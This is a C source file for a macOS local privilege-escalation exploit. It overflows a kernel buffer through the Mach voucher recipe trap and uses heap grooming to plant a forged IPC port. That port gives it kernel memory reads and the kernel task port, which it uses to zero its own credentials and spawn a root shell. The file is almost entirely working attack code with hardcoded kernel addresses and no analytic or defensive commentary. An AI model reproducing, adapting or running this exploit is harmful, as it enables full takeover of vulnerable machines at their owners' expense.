#include <assert.h>
#include <atm/atm_types.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

// Compile: clang getroot.c -o getroot -pagezero_size 0x200000 -fno-stack-protector -mmacosx-version-min=10.11

typedef vm_offset_t ipc_kobject_t;

typedef struct {
	mach_msg_header_t head;
	mach_msg_body_t msgh_body;
	mach_msg_ool_ports_descriptor_t desc[1];
	char pad[4096];
} ool_msg;

struct fake_ipc_object {
	natural_t io_bits;
	natural_t io_references;
	char io_lock_data[0x100];
};

mach_port_t create_voucher() {
	mach_port_t p = MACH_PORT_NULL;  //
	mach_voucher_attr_recipe_data_t recipe;
	memset((char *)&recipe, 0, sizeof(recipe));
	recipe.key = MACH_VOUCHER_ATTR_KEY_ATM;
	recipe.command = MACH_VOUCHER_ATTR_ATM_CREATE;

	kern_return_t kr = host_create_mach_voucher(
	    mach_host_self(),  // self host
	    (mach_voucher_attr_raw_recipe_array_t)&recipe,
	    sizeof(recipe),
	    &p);
	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to create voucher\n");
		exit(1);
	}
	return p;
}

uint64_t roundup(uint64_t val, uint64_t pagesize) {
	val += pagesize - 1;
	val &= ~(pagesize - 1);
	return val;
}

uint32_t read_kernel(mach_port_t port, void *faketask, uint64_t addr) {
	uint32_t res;
	*(uint64_t *)(faketask + 0x380) = addr - 0x10;
	pid_for_task(port, (int *)&res);
	return res;
}

void read_kernel64(mach_port_t port, void *faketask, uint64_t addr, char *dst) {
	uint32_t r1 = read_kernel(port, faketask, addr);
	uint32_t r2 = read_kernel(port, faketask, addr + 0x4);
	memcpy((char *)&dst, &r1, sizeof(uint32_t));
	memcpy((char *)&dst + 4, &r2, sizeof(uint32_t));
}

void g3t_r00t(struct fake_ipc_object *fakeport, mach_port_t port) {
	printf("[*] try to find clock_list\n");
	kern_return_t kr = 0;
	uint64_t clock_list = 0xffffff8000a271c0;  // nm /System/Library/Kernel/kernel | grep _clock_list
	uint64_t allproc = 0xffffff8000abb490;
	uint64_t clock_list_addr = 0;
	uint64_t base = 0xffffff8000200000;  // kernel_base_addr = 0x200000 * slide_value + base
	uint64_t kernel_slide = 0;
	boolean_t found_clock = 0;
	for (int i = 0; i < 0xFFFF; i++) {
		for (int k = 0; k <= 0x200000 / 8; k += 8) {
			*(uint64_t *)(((uint64_t)fakeport) + 0x68) = base + i * 0x200000 + k;
			kr = clock_sleep_trap(port, 0, 0, 0, 0);
			if (kr != KERN_FAILURE) {
				printf("[+] found clock_list! 0x%llx\n", *(uint64_t *)(((uint64_t)fakeport) + 0x68));
				clock_list_addr = *(uint64_t *)(((uint64_t)fakeport) + 0x68);
				found_clock = 1;
				goto found;
			}
		}
	}
found:
	if (!found_clock) {
		fprintf(stderr, "failed to find clock_list\n");
		exit(1);
	}
	kernel_slide = clock_list_addr - clock_list;
	allproc += kernel_slide;

	fakeport->io_bits = IKOT_TASK | IO_BITS_ACTIVE;  // cast fakeport to a task
	fakeport->io_references = 0xff;
	char *faketask = ((char *)fakeport) + 0x1000;

	*(uint64_t *)(((uint64_t)fakeport) + 0x68) = (uint64_t)faketask;
	*(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;
	*(uint64_t *)(faketask + 0x10) = 0xee;

	printf("[*] try to find kernel proc\n");
	uint32_t proc_offset = 0, r1, r2;
	uint64_t kernel_proc = 0, self_proc = 0;
	while (1) {
		uint64_t n;
		r1 = read_kernel(port, faketask, allproc);
		r2 = read_kernel(port, faketask, allproc + 0x4);
		memcpy((char *)&n, &r1, sizeof(uint32_t));
		memcpy((char *)&n + 4, &r2, sizeof(uint32_t));

		uint32_t proc = read_kernel(port, faketask, allproc + 0x10);
		if (proc == getpid()) {
			self_proc = allproc;
			printf("[+] found self proc pid=%d addr=0x%llx\n", proc, self_proc);
		} else if (proc == 0) {
			kernel_proc = allproc;
			printf("[+] found kernel proc pid=%d addr=0x%llx\n", proc, kernel_proc);
		}
		allproc = n;

		if (self_proc != 0 && kernel_proc != 0) break;
	}

	char *kernel_task_port_dump = malloc(0x1000);
	char *kernel_task_dump = malloc(0x1000);

	uint64_t kernel_task = 0, kernel_itk_self = 0;  // osfmk/kern/task

	r1 = read_kernel(port, faketask, kernel_proc + 0x18);
	r2 = read_kernel(port, faketask, kernel_proc + 0x18 + 0x4);
	memcpy((char *)&kernel_task, &r1, sizeof(uint32_t));
	memcpy((char *)&kernel_task + 4, &r2, sizeof(uint32_t));
	printf("[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n", kernel_task, kernel_itk_self);

	r1 = read_kernel(port, faketask, kernel_task + 0xe8);
	r2 = read_kernel(port, faketask, kernel_task + 0xe8 + 0x4);
	memcpy((char *)&kernel_itk_self, &r1, sizeof(uint32_t));
	memcpy((char *)&kernel_itk_self + 4, &r2, sizeof(uint32_t));

	printf("[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n", kernel_task, kernel_itk_self);

	for (int i = 0; i < 0x1000 / 4; ++i) {
		r1 = read_kernel(port, faketask, kernel_task + i * 4);
		memcpy(kernel_task_dump + i * 4, &r1, sizeof(uint32_t));
	}

	for (int i = 0; i < 0x1000 / 4; ++i) {
		r1 = read_kernel(port, faketask, kernel_itk_self + i * 4);
		memcpy(kernel_task_port_dump + i * 4, &r1, sizeof(uint32_t));
	}

	//get root
	uint64_t cred;
	r1 = read_kernel(port, faketask, self_proc + 0xe8);
	r2 = read_kernel(port, faketask, self_proc + 0xe8 + 0x4);
	memcpy((char *)&cred, &r1, sizeof(uint32_t));
	memcpy((char *)&cred + 4, &r2, sizeof(uint32_t));

	printf("[+] found cred 0x%llx\n", cred);

	memcpy(fakeport, kernel_task_port_dump, 0x1000);
	memcpy(faketask, kernel_task_dump, 0x1000);

	*(uint64_t *)(((uint64_t)fakeport) + 0x68) = (uint64_t)faketask;
	*(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;

	*(uint64_t *)(((uint64_t)faketask) + 0x2b8) = kernel_itk_self;
	mach_port_t tfp0;

	task_get_special_port(port, 4, &tfp0);
	printf("[+] tfp0 0x%x\n", tfp0);
	fakeport->io_bits = 0;

	uint64_t u = 0;
	mach_vm_write(tfp0, cred + 0x18, (vm_offset_t)&u, (mach_msg_type_number_t)8);
	if (getuid() == 0) printf("[+] g0t r00t! getuid = %d\n", getuid());

	system("/bin/bash");
}

int main() {
	uint64_t map_addr = 0;
	kern_return_t kr = 0;
	const int ports_cnt = 0x800;

	mach_port_t ports[ports_cnt];
	// memset(ports, 0, sizeof(mach_port_t) * 800);

	mach_port_t ports_for_msg[0x1000];
	memset(ports_for_msg, 0xff, sizeof(mach_port_t) * 0x1000);
	
	printf("[*] port? 0x%x\n", ports_for_msg[1]);

	mach_port_t vp = create_voucher();
	printf("[*] get voucher port 0x%x\n", vp);

	for (int i = 0; i < ports_cnt; i++) {
		mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
		mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
	}

	ool_msg msg, msg_recv;
	memset(&msg, 0, sizeof(ool_msg));
	memset(&msg_recv, 0, sizeof(ool_msg));

	msg.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
	msg.head.msgh_local_port = MACH_PORT_NULL;
	msg.head.msgh_size = sizeof(ool_msg) - 2048;
	msg.msgh_body.msgh_descriptor_count = 1;
	msg.desc[0].address = ports_for_msg;
	msg.desc[0].count = 32;  // kalloc256
	msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	msg.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;

	printf("[*] do heap fengshui\n");

	sleep(1);
	for (int i = 0; i < ports_cnt; i++) {
		msg.head.msgh_remote_port = ports[i];
		kr = mach_msg((mach_msg_header_t *)&msg.head, MACH_SEND_MSG, msg.head.msgh_size, 0, 0, 0, 0);
		if (kr != KERN_SUCCESS) {
			fprintf(stderr, "failed to send message\n");
			exit(1);
		}
	}

	sleep(1);
	for (int i = 0x100; i < ports_cnt / 2; i += 4) {
		msg_recv.head.msgh_local_port = ports[i];
		kr = mach_msg((mach_msg_header_t *)&msg_recv.head, MACH_RCV_MSG, 0, sizeof(ool_msg), ports[i], 0, 0);
		if (kr != KERN_SUCCESS) {
			fprintf(stderr, "failed to receieve message\n");
			exit(1);
		}
	}

	sleep(1);
	for (int i = 0x100; i < ports_cnt / 2; i += 4) {
		msg.head.msgh_remote_port = ports[i];
		kr = mach_msg((mach_msg_header_t *)&msg.head, MACH_SEND_MSG, msg.head.msgh_size, 0, 0, 0, 0);
		if (kr != KERN_SUCCESS) {
			fprintf(stderr, "failed to send message\n");
			exit(1);
		}
	}

	struct fake_ipc_object *fakeport = malloc(sizeof(struct fake_ipc_object) + 0x3000);
	printf("[*] fakeport %p\n", fakeport);
	fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
	fakeport->io_lock_data[12] = 0x11;
	
	// trigger overflow
	const int overflow_size = (1 << 5);
	uint64_t payload[overflow_size] = {0};
	for (int i = 0; i < overflow_size; ++i) {
		payload[i] = (uint64_t)fakeport;
	}

	uint64_t kalloc_size = 0x100;

	uint64_t *recipe_size = &kalloc_size;

	uint64_t cp_size = kalloc_size + overflow_size;  // 8 for overflow size
	uint64_t roundup_size = roundup(cp_size, getpagesize());
	uint64_t alloc_size = roundup_size + getpagesize();

	kr = mach_vm_allocate(mach_task_self(), &map_addr, alloc_size, VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "failed to allocate\n");
		exit(1);
	}
	uint64_t base = map_addr; 
	uint64_t end = base + roundup_size;

	kr = mach_vm_deallocate(mach_task_self(), end, getpagesize());	// unmap the memory
	if (kr != KERN_SUCCESS) {
		exit(1);
	}

	uint64_t start = end - cp_size;
	uint8_t *recipe = (uint8_t *)start;

	printf("[*] base = 0x%llx\n", base);
	printf("[*] start = 0x%llx\n", start);
	printf("[*] end = 0x%llx\n", end);

	memset(recipe, 0x41, kalloc_size);
	memcpy(recipe + kalloc_size, payload, overflow_size);

	printf("[*] ready to trigger the overflow\n");
	kr = mach_voucher_extract_attr_recipe_trap(vp, 1, recipe, (mach_msg_type_number_t *)recipe_size);
	sleep(3);

	printf("[*] ready to receive ports\n");
	mach_port_t foundport = MACH_PORT_NULL;
	for (int i = 0x100; i < ports_cnt / 2; i++) {
		pthread_yield_np();
		msg.head.msgh_local_port = ports[i];
		kr = mach_msg((mach_msg_header_t *)&msg, MACH_RCV_MSG, 0, sizeof(msg), ports[i], 0, 0);
		if (kr != KERN_SUCCESS) {
			fprintf(stderr, "failed to receive message\n");
			exit(1);
		}
		for (int j = 0; j < msg.msgh_body.msgh_descriptor_count; j++) {
			mach_port_t *recv_ports = msg.desc[j].address;
			for (int k = 0; k < 32; k++) {
				// printf("0x%x\n", recv_ports[k]);
				if (recv_ports[k] != MACH_PORT_DEAD && recv_ports[k] != MACH_PORT_NULL) {
					foundport = recv_ports[k];
					printf("[+] found port! 0x%x\n", foundport);
					g3t_r00t(fakeport, foundport);
					return 0;
				}
			}
		}

		mach_msg_destroy(&msg.head);
		mach_port_deallocate(mach_task_self(), ports[i]);
		ports[i] = 0;
	}
	return 0;
}